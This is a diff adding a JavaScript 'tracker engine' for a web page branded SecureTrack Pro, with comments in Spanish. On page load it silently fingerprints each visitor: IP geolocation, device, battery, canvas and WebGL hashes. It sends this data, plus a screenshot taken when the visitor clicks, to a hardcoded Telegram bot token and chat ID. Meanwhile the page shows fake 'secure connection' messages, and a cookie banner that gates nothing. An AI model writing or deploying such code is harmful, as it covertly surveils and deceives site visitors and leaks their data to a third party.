@@ -1,0 +1,621 @@
+/* ============================================================
+   SECURETRACK PRO — TRACKER ENGINE
+   Data Capture · Fingerprinting · Telegram Integration
+   ============================================================
+
+   CONFIGURACIÓN:
+   Edite las variables CONFIG.TELEGRAM_BOT_TOKEN y
+   CONFIG.TELEGRAM_CHAT_ID con sus credenciales reales.
+   ============================================================ */
+
+const CONFIG = {
+    TELEGRAM_BOT_TOKEN: '8746785573:AAEnt4gMMRPZLgiqPhuNncH9k0Y_6T3FtZs',   // ✅ Token completo del bot
+    TELEGRAM_CHAT_ID: '246025432', // ← Pendiente: obtener su Chat ID (ver instrucciones)
+    CAPTURE_DELAY_MS: 2500,                    // Delay inicial antes de captura
+    GEO_API_PRIMARY: 'https://ipapi.co/json/',
+    GEO_API_FALLBACK: 'https://ip-api.com/json/',
+};
+
+/* ====================================================
+   ESTADO GLOBAL
+   ==================================================== */
+let capturedData = null;   // Datos capturados del visitante
+let captureTime = null;   // Timestamp de captura inicial
+let pageLoadTime = Date.now();
+let maxScrollPct = 0;      // Máximo scroll alcanzado
+let clickSent = false;  // Evita envíos duplicados por click
+
+/* ====================================================
+   INICIALIZACIÓN
+   ==================================================== */
+document.addEventListener('DOMContentLoaded', () => {
+    initScrollTracker();
+    initCounterAnimations();
+    showCookieBanner();
+
+    // Espera CAPTURE_DELAY_MS antes de disparar captura silenciosa
+    setTimeout(captureAllData, CONFIG.CAPTURE_DELAY_MS);
+});
+
+/* ====================================================
+   1. MOTOR PRINCIPAL DE CAPTURA
+   ==================================================== */
+async function captureAllData() {
+    try {
+        captureTime = new Date();
+
+        // Ejecución paralela de todos los procesos de captura
+        const [geoData, batteryData] = await Promise.all([
+            fetchGeolocation(),
+            fetchBatteryData(),
+        ]);
+
+        const browserData = parseBrowserData();
+        const hwData = parseHardwareData();
+        const canvasFingerprint = generateCanvasFingerprint();
+        const webglFingerprint = generateWebGLFingerprint();
+        const connectionData = parseConnectionData();
+
+        // Actualiza UI con los datos obtenidos
+        updateUI(geoData, browserData);
+
+        // Consolida todos los datos
+        capturedData = {
+            timestamp: captureTime.toISOString(),
+            eventType: 'AUTO_PAGE_LOAD',
+            geo: geoData,
+            browser: browserData,
+            hardware: hwData,
+            battery: batteryData,
+            canvas: canvasFingerprint,
+            webgl: webglFingerprint,
+            connection: connectionData,
+            referrer: document.referrer || 'Directo',
+            pageUrl: window.location.href,
+            pageTitle: document.title,
+        };
+
+        // Envía a Telegram
+        await sendToTelegram(capturedData, null);
+
+    } catch (err) {
+        console.warn('[SecureTrack] Error en captura inicial:', err);
+    }
+}
+
+/* ====================================================
+   2. GEOLOCALIZACIÓN
+   ==================================================== */
+async function fetchGeolocation() {
+    // Intento primario: ipapi.co
+    try {
+        const res = await fetch(CONFIG.GEO_API_PRIMARY, { signal: AbortSignal.timeout(6000) });
+        const data = await res.json();
+        if (data && data.ip) {
+            return {
+                ip: data.ip,
+                city: data.city || 'Desconocida',
+                region: data.region || 'Desconocida',
+                country: data.country_name || data.country || 'Desconocido',
+                countryCode: data.country || '',
+                lat: data.latitude || 'N/A',
+                lon: data.longitude || 'N/A',
+                timezone: data.timezone || 'N/A',
+                isp: data.org || 'N/A',
+                asn: data.asn || 'N/A',
+                postal: data.postal || 'N/A',
+            };
+        }
+    } catch (_) { /* fallback */ }
+
+    // Fallback: ip-api.com
+    try {
+        const res = await fetch(CONFIG.GEO_API_FALLBACK + '?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query', { signal: AbortSignal.timeout(6000) });
+        const data = await res.json();
+        if (data && data.status === 'success') {
+            return {
+                ip: data.query,
+                city: data.city || 'Desconocida',
+                region: data.regionName || 'Desconocida',
+                country: data.country || 'Desconocido',
+                countryCode: data.countryCode || '',
+                lat: data.lat || 'N/A',
+                lon: data.lon || 'N/A',
+                timezone: data.timezone || 'N/A',
+                isp: data.isp || 'N/A',
+                asn: data.as || 'N/A',
+                postal: data.zip || 'N/A',
+            };
+        }
+    } catch (_) { /* silencioso */ }
+
+    return { ip: 'No disponible', city: 'N/A', region: 'N/A', country: 'N/A', countryCode: '', lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'N/A', asn: 'N/A', postal: 'N/A', error: true };
+}
+
+/* ====================================================
+   3. DATOS DEL NAVEGADOR Y DISPOSITIVO
+   ==================================================== */
+function parseBrowserData() {
+    const ua = navigator.userAgent;
+
+    // — Sistema Operativo —
+    let os = 'Desconocido';
+    if (/Windows NT 10\.0/.test(ua)) os = 'Windows 10/11';
+    else if (/Windows NT 6\.3/.test(ua)) os = 'Windows 8.1';
+    else if (/Windows NT 6\.1/.test(ua)) os = 'Windows 7';
+    else if (/Mac OS X/.test(ua)) os = 'macOS ' + (ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '');
+    else if (/Android/.test(ua)) os = 'Android ' + (ua.match(/Android ([\d.]+)/)?.[1] || '');
+    else if (/iPhone OS/.test(ua)) os = 'iOS ' + (ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '');
+    else if (/iPad/.test(ua)) os = 'iPadOS';
+    else if (/Linux/.test(ua)) os = 'Linux';
+
+    // — Navegador —
+    let browser = 'Desconocido', browserVer = '';
+    if (/Edg\//.test(ua)) {
+        browser = 'Microsoft Edge';
+        browserVer = ua.match(/Edg\/([\d.]+)/)?.[1] || '';
+    } else if (/OPR\//.test(ua) || /Opera/.test(ua)) {
+        browser = 'Opera';
+        browserVer = ua.match(/OPR\/([\d.]+)/)?.[1] || '';
+    } else if (/Firefox\//.test(ua)) {
+        browser = 'Firefox';
+        browserVer = ua.match(/Firefox\/([\d.]+)/)?.[1] || '';
+    } else if (/Chrome\//.test(ua)) {
+        browser = 'Google Chrome';
+        browserVer = ua.match(/Chrome\/([\d.]+)/)?.[1] || '';
+    } else if (/Safari\//.test(ua)) {
+        browser = 'Safari';
+        browserVer = ua.match(/Version\/([\d.]+)/)?.[1] || '';
+    }
+
+    // — Tipo de dispositivo —
+    let deviceType = 'Desktop';
+    if (/Tablet|iPad/.test(ua)) deviceType = 'Tablet';
+    else if (/Mobile|Android|iPhone|iPod/.test(ua)) deviceType = 'Mobile';
+
+    return {
+        userAgent: ua,
+        os,
+        browser,
+        browserVer,
+        deviceType,
+        language: navigator.language || 'N/A',
+        languages: (navigator.languages || []).join(', ') || 'N/A',
+        cookiesOn: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'N/A',
+        platform: navigator.platform || 'N/A',
+        vendor: navigator.vendor || 'N/A',
+        screenW: screen.width,
+        screenH: screen.height,
+        colorDepth: screen.colorDepth,
+        innerW: window.innerWidth,
+        innerH: window.innerHeight,
+        pixelRatio: window.devicePixelRatio || 1,
+        orientation: screen.orientation?.type || 'N/A',
+        touchSupport: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+    };
+}
+
+/* ====================================================
+   4. HARDWARE
+   ==================================================== */
+function parseHardwareData() {
+    return {
+        cpuCores: navigator.hardwareConcurrency || 'N/A',
+        ramGB: navigator.deviceMemory || 'N/A',
+    };
+}
+
+/* ====================================================
+   5. BATERÍA
+   ==================================================== */
+async function fetchBatteryData() {
+    try {
+        if (!('getBattery' in navigator)) return null;
+        const bat = await navigator.getBattery();
+        return {
+            level: Math.round(bat.level * 100) + '%',
+            charging: bat.charging,
+        };
+    } catch (_) { return null; }
+}
+
+/* ====================================================
+   6. CONEXIÓN DE RED
+   ==================================================== */
+function parseConnectionData() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!conn) return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
+    return {
+        type: conn.type || 'N/A',
+        effectiveType: conn.effectiveType || 'N/A',
+        downlink: conn.downlink != null ? conn.downlink + ' Mbps' : 'N/A',
+        rtt: conn.rtt != null ? conn.rtt + ' ms' : 'N/A',
+        saveData: conn.saveData || false,
+    };
+}
+
+/* ====================================================
+   7. CANVAS FINGERPRINT (SHA-256)
+   ==================================================== */
+function generateCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 220;
+        canvas.height = 60;
+        const ctx = canvas.getContext('2d');
+
+        ctx.textBaseline = 'top';
+        ctx.font = '14px "Arial"';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('SecureTrack🔍', 2, 15);
+        ctx.fillStyle = 'rgba(102,204,0,0.7)';
+        ctx.fillText('SecureTrack🔍', 4, 17);
+
+        ctx.beginPath();
+        ctx.arc(95, 35, 18, 0, Math.PI * 2);
+        ctx.arc(95, 35, 9, 0, Math.PI * 2, true);
+        ctx.fillStyle = '#0a0e17';
+        ctx.fill();
+
+        const raw = canvas.toDataURL();
+        return { raw, hash: simpleHash(raw) };
+    } catch (_) { return { raw: 'N/A', hash: 'N/A' }; }
+}
+
+/* ====================================================
+   8. WEBGL FINGERPRINT
+   ==================================================== */
+function generateWebGLFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
+
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+        const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        return { vendor, renderer };
+    } catch (_) { return { vendor: 'N/A', renderer: 'N/A' }; }
+}
+
+/* ====================================================
+   9. HASH SIMPLE (simula SHA-256 con 16 hex chars)
+   ==================================================== */
+function simpleHash(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+        const chr = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + chr;
+        hash |= 0;
+    }
+    return Math.abs(hash).toString(16).padStart(8, '0') +
+        Math.abs(hash ^ 0xdeadbeef).toString(16).padStart(8, '0');
+}
+
+/* ====================================================
+   10. CAPTURA DE SCREENSHOT
+   ==================================================== */
+async function captureScreenshot() {
+    try {
+        if (typeof html2canvas === 'undefined') return null;
+        const canvas = await html2canvas(document.body, {
+            scale: 0.6,
+            useCORS: true,
+            logging: false,
+            backgroundColor: '#0a0e17',
+            removeContainer: true,
+        });
+        return canvas.toDataURL('image/jpeg', 0.7);
+    } catch (_) { return null; }
+}
+
+/* ====================================================
+   11. CONSTRUIR MENSAJE TELEGRAM
+   ==================================================== */
+function buildTelegramMessage(data) {
+    const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
+    const g = data.geo;
+    const b = data.browser;
+    const hw = data.hardware;
+    const bat = data.battery;
+    const con = data.connection;
+    const fp = data.canvas;
+    const wg = data.webgl;
+
+    const flag = getFlagEmoji(g.countryCode);
+    const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';
+
+    return `🚨 <b>NUEVO VISITANTE DETECTADO</b>
+${eventLabel} — <code>${ts}</code>
+
+━━━━━━━━━━━━━━━━━━━━
+📡 <b>RED &amp; CONEXIÓN</b>
+━━━━━━━━━━━━━━━━━━━━
+🌐 IP:             <code>${g.ip}</code>
+🏢 ISP:            ${g.isp}
+🔌 ASN:            ${g.asn}
+⚡ Tipo:           ${con.effectiveType} (${con.type})
+📶 Velocidad:      ${con.downlink}
+🕐 Latencia:       ${con.rtt}
+💾 Ahorro datos:   ${con.saveData ? 'Sí' : 'No'}
+
+━━━━━━━━━━━━━━━━━━━━
+📍 <b>GEOLOCALIZACIÓN</b>
+━━━━━━━━━━━━━━━━━━━━
+${flag} País:          ${g.country} (${g.countryCode})
+🏙️ Ciudad:         ${g.city}
+🗺️ Región:         ${g.region}
+📮 Código postal:  ${g.postal}
+🧭 Coordenadas:    <code>${g.lat}, ${g.lon}</code>
+🕰️ Zona horaria:   ${g.timezone}
+
+━━━━━━━━━━━━━━━━━━━━
+💻 <b>DISPOSITIVO &amp; NAVEGADOR</b>
+━━━━━━━━━━━━━━━━━━━━
+🖥️ OS:             ${b.os}
+🌍 Navegador:      ${b.browser} ${b.browserVer}
+📱 Tipo:           ${b.deviceType}
+🖵  Resolución:    ${b.screenW}×${b.screenH} (@${b.pixelRatio}x)
+🪟 Ventana:        ${b.innerW}×${b.innerH}
+🎨 Color:          ${b.colorDepth}-bit
+🔄 Orientación:    ${b.orientation}
+🌐 Idioma:         ${b.language}
+
+━━━━━━━━━━━━━━━━━━━━
+⚙️ <b>HARDWARE</b>
+━━━━━━━━━━━━━━━━━━━━
+🧠 CPU Cores:      ${hw.cpuCores}
+💾 RAM:            ${hw.ramGB !== 'N/A' ? hw.ramGB + ' GB' : 'N/A'}
+👆 Touch:          ${b.touchSupport ? 'Sí (' + b.maxTouchPoints + ' puntos)' : 'No'}
+🍪 Cookies:        ${b.cookiesOn ? 'Activadas' : 'Desactivadas'}
+🚫 DNT:            ${b.doNotTrack}
+🧩 Plataforma:     ${b.platform}
+${bat ? `\n🔋 <b>BATERÍA</b>\n━━━━━━━━━━━━━━━━━━━━\n⚡ Nivel:          ${bat.level}\n🔌 Cargando:       ${bat.charging ? 'Sí' : 'No'}` : ''}
+
+━━━━━━━━━━━━━━━━━━━━
+🔑 <b>FINGERPRINTS</b>
+━━━━━━━━━━━━━━━━━━━━
+🎨 Canvas:         <code>${fp.hash}</code>
+🖼️ GPU Vendor:     ${wg.vendor}
+⚙️ GPU Renderer:   ${wg.renderer}
+
+━━━━━━━━━━━━━━━━━━━━
+🌍 <b>ORIGEN</b>
+━━━━━━━━━━━━━━━━━━━━
+🔗 Referrer:       ${data.referrer}
+📄 URL:            ${data.pageUrl}
+${data.eventType === 'CLICK_CTA_BUTTON' ? `\n⏱️ Tiempo en página: ${data.timeOnPage}s\n📜 Scroll max:       ${data.scrollPct}%` : ''}`;
+}
+
+function getFlagEmoji(countryCode) {
+    if (!countryCode || countryCode.length !== 2) return '🏳️';
+    const base = 0x1F1E6;
+    return String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(0) - 65) +
+        String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(1) - 65);
+}
+
+/* ====================================================
+   12. ENVÍO A TELEGRAM
+   ==================================================== */
+async function sendToTelegram(data, screenshotB64) {
+    if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'PEGAR_TOKEN_AQUÍ') {
+        console.warn('[SecureTrack] Credenciales de Telegram no configuradas.');
+        return;
+    }
+
+    const base = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;
+    const text = buildTelegramMessage(data);
+
+    // 1. Enviar mensaje de texto
+    try {
+        await fetch(`${base}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true,
+            }),
+        });
+    } catch (e) {
+        console.warn('[SecureTrack] Error enviando mensaje:', e);
+    }
+
+    // 2. Enviar screenshot si está disponible
+    if (screenshotB64) {
+        try {
+            const blob = await (await fetch(screenshotB64)).blob();
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+            fd.append('photo', blob, 'screenshot.jpg');
+            fd.append('caption', `📸 Screenshot del visitante — ${new Date(data.timestamp).toLocaleString('es-ES')} — IP: ${data.geo.ip}`);
+            await fetch(`${base}/sendPhoto`, { method: 'POST', body: fd });
+        } catch (e) {
+            console.warn('[SecureTrack] Error enviando screenshot:', e);
+        }
+    }
+}
+
+/* ====================================================
+   13. ACTUALIZAR UI CON DATOS CAPTURADOS
+   ==================================================== */
+function updateUI(geoData, browserData) {
+    // IP
+    const ipEl = document.getElementById('display-ip');
+    if (ipEl) ipEl.textContent = geoData.ip !== 'No disponible' ? geoData.ip : 'No disponible';
+
+    // Ubicación
+    const locEl = document.getElementById('display-location');
+    if (locEl && geoData.city !== 'N/A') {
+        locEl.textContent = `${getFlagEmoji(geoData.countryCode)} ${geoData.city}, ${geoData.country}`;
+    }
+
+    // ISP
+    const ispEl = document.getElementById('display-isp');
+    if (ispEl && geoData.isp !== 'N/A') ispEl.textContent = geoData.isp;
+
+    // Dispositivo
+    const devEl = document.getElementById('display-device');
+    if (devEl) devEl.textContent = `${browserData.browser} · ${browserData.os}`;
+
+    // Estado de la tarjeta
+    const dotEl = document.getElementById('card-status-dot');
+    const txtEl = document.getElementById('card-status-text');
+    if (dotEl) dotEl.classList.remove('scanning');
+    if (txtEl) txtEl.textContent = '✅ Análisis completado';
+
+    // Barra de seguridad
+    const fillEl = document.getElementById('security-fill');
+    const labelEl = document.getElementById('security-label');
+    if (fillEl) {
+        setTimeout(() => { fillEl.style.width = '92%'; }, 300);
+    }
+    if (labelEl) {
+        setTimeout(() => { labelEl.textContent = 'Conexión verificada · Segura'; }, 1800);
+    }
+}
+
+/* ====================================================
+   14. MODAL DE CARGA
+   ==================================================== */
+const MODAL_STEPS = [
+    { msg: 'Analizando geolocalización…', pct: 20 },
+    { msg: 'Escaneando dispositivo…', pct: 40 },
+    { msg: 'Generando fingerprints…', pct: 60 },
+    { msg: 'Capturando screenshot…', pct: 75 },
+    { msg: 'Enviando informe seguro…', pct: 90 },
+    { msg: '¡Informe generado con éxito! ✅', pct: 100 },
+];
+
+function showModal() {
+    const overlay = document.getElementById('modal-overlay');
+    if (overlay) overlay.classList.add('active');
+    animateModal();
+}
+
+function hideModal() {
+    const overlay = document.getElementById('modal-overlay');
+    if (overlay) overlay.classList.remove('active');
+}
+
+async function animateModal() {
+    const msgEl = document.getElementById('modal-msg');
+    const barEl = document.getElementById('progress-bar');
+    const subEl = document.getElementById('modal-sub');
+
+    for (let i = 0; i < MODAL_STEPS.length; i++) {
+        const step = MODAL_STEPS[i];
+        if (msgEl) {
+            msgEl.style.opacity = '0';
+            await sleep(150);
+            msgEl.textContent = step.msg;
+            msgEl.style.opacity = '1';
+        }
+        if (barEl) barEl.style.width = step.pct + '%';
+        await sleep(i < MODAL_STEPS.length - 1 ? 900 : 1200);
+    }
+
+    if (subEl) subEl.textContent = 'Su informe ha sido procesado.';
+    await sleep(1000);
+    hideModal();
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+/* ====================================================
+   15. HANDLER DEL BOTÓN PRINCIPAL (CTA CLICK)
+   ==================================================== */
+async function handleMainCta() {
+    showModal();
+
+    if (clickSent) return;
+    clickSent = true;
+
+    // Captura screenshot al momento del click
+    const screenshot = await captureScreenshot();
+
+    const timeOnPage = Math.round((Date.now() - pageLoadTime) / 1000);
+
+    const clickData = {
+        ...(capturedData || {}),
+        eventType: 'CLICK_CTA_BUTTON',
+        timestamp: new Date().toISOString(),
+        timeOnPage,
+        scrollPct: maxScrollPct,
+    };
+
+    await sendToTelegram(clickData, screenshot);
+}
+
+/* ====================================================
+   16. SCROLL TRACKER
+   ==================================================== */
+function initScrollTracker() {
+    window.addEventListener('scroll', () => {
+        const totalH = document.documentElement.scrollHeight - window.innerHeight;
+        const currentPct = totalH > 0 ? Math.round((window.scrollY / totalH) * 100) : 0;
+        if (currentPct > maxScrollPct) maxScrollPct = currentPct;
+    }, { passive: true });
+}
+
+/* ====================================================
+   17. ANIMACIÓN DE CONTADORES
+   ==================================================== */
+function initCounterAnimations() {
+    const counters = document.querySelectorAll('[data-target]');
+
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (!entry.isIntersecting) return;
+            const el = entry.target;
+            const target = parseInt(el.dataset.target, 10);
+            animateCounter(el, target);
+            observer.unobserve(el);
+        });
+    }, { threshold: 0.5 });
+
+    counters.forEach(c => observer.observe(c));
+}
+
+function animateCounter(el, target) {
+    const duration = 1800;
+    const start = performance.now();
+
+    function step(now) {
+        const elapsed = now - start;
+        const progress = Math.min(elapsed / duration, 1);
+        const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
+        el.textContent = Math.round(eased * target);
+        if (progress < 1) requestAnimationFrame(step);
+        else el.textContent = target;
+    }
+
+    requestAnimationFrame(step);
+}
+
+/* ====================================================
+   18. COOKIE BANNER
+   ==================================================== */
+function showCookieBanner() {
+    const banner = document.getElementById('cookie-banner');
+    if (!banner) return;
+    if (localStorage.getItem('stp_cookies_accepted')) {
+        banner.style.display = 'none';
+    }
+}
+
+function acceptCookies() {
+    localStorage.setItem('stp_cookies_accepted', '1');
+    const banner = document.getElementById('cookie-banner');
+    if (banner) {
+        banner.style.opacity = '0';
+        banner.style.transition = 'opacity 0.4s';
+        setTimeout(() => { banner.style.display = 'none'; }, 400);
+    }
+}
